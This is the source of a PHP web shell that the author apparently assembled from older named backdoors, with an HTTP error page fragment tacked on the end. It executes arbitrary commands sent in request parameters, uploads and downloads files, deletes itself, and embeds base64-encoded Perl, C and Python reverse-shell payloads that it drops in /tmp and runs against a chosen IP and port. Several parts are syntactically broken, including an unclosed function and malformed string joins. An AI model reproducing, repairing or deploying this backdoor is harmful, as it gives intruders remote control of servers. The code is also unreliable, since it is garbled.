<?php
// Made bits I liked the look of from  simple_cmd.php, simple-backdoor.php, php-backdoor.php, predator.php, AK-74.php
// At some point it helps if you like silly names in the early 2000s
// php-backdoor can upload and download stuff!

ob_implicit_flush();
error_reporting(0);
$name="9b534ea55d0b82c3a7e80003a84b6865";     //login = 'mylogin'
$pass="a029d0df84eb5549c641e04a9ef389e5";     //pass  = 'mypass'
if($auth == 1){
if (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || md5($HTTP_SERVER_VARS['PHP_AUTH_USER'])!=$name || md5($HTTP_SERVER_VARS['PHP_AUTH_PW'])!=$pass)
   {
   header("WWW-Authenticate: Basic realm=\"PanelAccess\"");
   header("HTTP/1.0 404 Unauthorized");
   exit("Access Denied");
   }
}


$checkIfDevShmIsExec = "mount|grep shm"  //TODO

if(isset($_REQUEST['shell_exec')){
        echo "<pre>";
        $shell_exec = $_REQUEST['shell_exec'];
        if ($shell_exc != ""){ print shell_exec($shell_exec); 
                } else { 
        echo "</pre>";
        die;
        }
}

if(isset($_REQUEST["system"])){
        echo "<pre>";
        $system = ($_REQUEST['system']);
        system($system);
        echo "</pre>";
        die;
}

if(isset($_REQUEST["passthru"])){
        echo "<pre>";
        $passthru = ($_REQUEST['passthru']);
        passthru($passthru);
        echo "</pre>";
        die;
}


if(isset($_REQUEST["upload"])){ //TODO better
        error_reporting(1);
        if(!isset($_REQUEST['dir'])) die('Specify a directory!?!') {
                else $dir=$_REQUEST['dir'];
        }
        $fname=$HTTP_POST_FILES['file_name']['name'];
        if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname)) {
                die('File uploading error.');
        }
        error_reporting(0);
}

function downloadfile($file) //TODO - make better
{
        header ("Content-Type: application/octet-stream");
        header ("Content-Length: " . filesize($file));
        header ("Content-Disposition: attachment; filename=$file");
        readfile($file);
        die();
}

if($_GET['kill']=='yes')
{
        unlink($_SERVER['SCRIPT_FILENAME']);
        echo "<script>alert('Your shell script was successfully deleted!')</script>";
}

function getsystem()
{
	return php_uname('s')." ".php_uname('r')." ".php_uname('v');
};	

function getserver()
{
	return getenv("SERVER_SOFTWARE");
};

function getuser()
{PHP_AUTH_PW
// backconnect
function selectShell($ip,$port,$method)
{
$perl = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

$c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

$python3 = "aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3MsIHN5cwpob3N0ID0gc3RyKHN5cy5hcmd2WzFd
KQpwb3J0ID0gaW50KHN5cy5hcmd2WzJdKQphZGRyID0gKGhvc3QsIHBvcnQpCnMgPSBzb2NrZXQu
c29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdChhZGRy
KQpvcy5kdXAyKHMuZmlsZW5vKCksIDApCm9zLmR1cDIocy5maWxlbm8oKSwgMSkKb3MuZHVwMihz
LmZpbGVubygpLCAyKQppbXBvcnQgcHR5CnB0eS5zcGF3bigiL2Jpbi9zaCIpCg==";

if($method=='Perl')
	{
		fputs($i=fopen('/tmp/shlbck','w'),base64_decode($perl));
		fclose($i);
		ex(which("nohup")" "which("perl")." /tmp/shlbck ".$ip." ".$port." &");
		unlink("/tmp/shlbck");
		return ex('netstat -an | grep -i listen');
	}
elseif($method=='C')
	{
		fputs($i=fopen('/tmp/shlbck.c','w'),base64_decode($c));
		fclose($i);
		ex("gcc shlbck.c -o shlbck");
		unlink('shlbck.c');
		ex(which("nohup")" /tmp/shlbck ".$ip." ".$port." &");
		unlink("/tmp/shlbck");
		return ex('netstat -an | grep -i listen');
	}
elseif($method=='Python3')
        {       
                fputs($i=fopen('/tmp/shlbck.py','w'),base64_decode($python3));
		fclose($i);
                ex(which("nohup")" "which("python3") ".$ip." ".$port." &);
		unlink("/tmp/shlbck");
		return ex('netstat -an | grep -i listen');

        } else {
	return 'Choose method';
	}
}


function testperl()
{
	if(ex('perl -h'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}

function testpython()
{
	if(ex('python3 -h'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}

function testwget()
{
	if(ex('wget --help'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}

function testcurl()
{
	if(ex('curl --help'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}

function getmicrotime()
{
        list($usec, $sec) = explode(" ",microtime()); 
        return ((float)$usec + (float)$sec); 
} 


function getpermission($path)
{

$perms = fileperms($path);

if (($perms & 0xC000) == 0xC000)
 $info = 's';
elseif (($perms & 0xA000) == 0xA000)
 $info = 'l';
elseif (($perms & 0x8000) == 0x8000)
 $info = '-';
elseif (($perms & 0x6000) == 0x6000)
 $info = 'b';
elseif (($perms & 0x4000) == 0x4000)
 $info = 'd';
elseif (($perms & 0x2000) == 0x2000)
 $info = 'c';
elseif (($perms & 0x1000) == 0x1000)
 $info = 'p';
else
 $info = 'u';

$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

return $info;
}

function getpermissionarray($path)
{
$res = array();
$perms = fileperms($path);

if (($perms & 0xC000) == 0xC000)
 $res[] = 's';
elseif (($perms & 0xA000) == 0xA000)
 $res[] = 'l';
elseif (($perms & 0x8000) == 0x8000)
 $res[] = '-'; 
elseif (($perms & 0x6000) == 0x6000)
 $res[] = 'b';
elseif (($perms & 0x4000) == 0x4000)
 $res[] = 'd';
elseif (($perms & 0x2000) == 0x2000)
 $res[] = 'c';
elseif (($perms & 0x1000) == 0x1000)
 $res[] = 'p';
else
 $res[] = 'u';

$res[] = (($perms & 0x0100) ? 'r' : '-');
$res[] = (($perms & 0x0080) ? 'w' : '-');
$res[] = (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

$res[] = (($perms & 0x0020) ? 'r' : '-');
$res[] = (($perms & 0x0010) ? 'w' : '-');
$res[] = (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

$res[] = (($perms & 0x0004) ? 'r' : '-');
$res[] = (($perms & 0x0002) ? 'w' : '-');
$res[] = (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

return $res;
}

// <pre><form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr></form> 
// <form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="cmd"><input type="submit" value="go"><hr></form> 
// http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix
// or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win
// </form>

// Really want it to state: Perspective Honed Persistence
// -- The empirical pentest webshell 
//
// Print what does and does not work - no include function or  
// Test the transpiled asp(x) version
// use: https://www.gaijin.at/en/tools/php-obfuscator
?>





<p>The request method <code>OPTIONS</code> is inappropriate for the URL <code>/</code>.  <ins>That’s all we know.</ins>
